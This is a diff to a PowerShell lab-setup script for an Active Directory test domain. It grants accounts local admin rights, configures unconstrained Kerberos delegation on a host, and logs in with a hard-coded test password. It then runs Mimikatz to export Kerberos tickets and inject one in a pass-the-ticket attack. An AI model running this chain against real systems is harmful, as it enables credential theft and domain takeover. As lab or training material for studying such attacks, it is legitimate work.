@@ -169,6 +169,7 @@ if (!([ADSI]::Exists("LDAP://CN=LocalAdminPC2,OU=LocalAdminAccounts,OU=Administr
 	Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) The user LocalAdminPC2 already exists. Moving On."
 }
 
+# Add user to local admin groups
 Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
 Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc1} -computername AdminPc.contoso.azure
 
@@ -178,9 +179,11 @@ Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localad
 Invoke-Command -ScriptBlock{net localgroup "Remote Desktop Users" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
 Invoke-Command -ScriptBlock{net localgroup "Administrators" /add CONTOSO\localadminpc2} -computername AdminPc2.contoso.azure
 
+# Make AdminPc trustedfordelegation (unconstrained)
 Get-ADComputer -Identity AdminPc | Set-ADAccountControl -TrustedForDelegation $True
 Get-ADComputer adminpc -Properties * | Format-List -Property *delegat*,msDS-AllowedToActOnBehalfOfOtherIdentity
 
+# Action to generate TGT on host AdminPc
 $SecPassword = ConvertTo-SecureString 'TestPassword123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\localadminpc2', $SecPassword)
 $s = New-PSSession -ComputerName AdminPc -Credential $Cred
@@ -188,9 +191,8 @@ Invoke-Command –Session $s -ScriptBlock {whoami; hostname}
 
 # Connect to server and run mimikatz
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
-* File: 'C:\Users\appadmin\Documents\user1\[0;6f5638a]-2-0-60a10000Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK 
 
-# Load Domain Admin ticket (TGT)
+# Load User ticket (TGT)
 Invoke-Mimikatz -Command '"kerberos::ptt [0;48b991]-2-0-60a10000-localadminpc2@krbtgt-CONTOSO.AZURE.kirbi"' 
 
 # Run commands
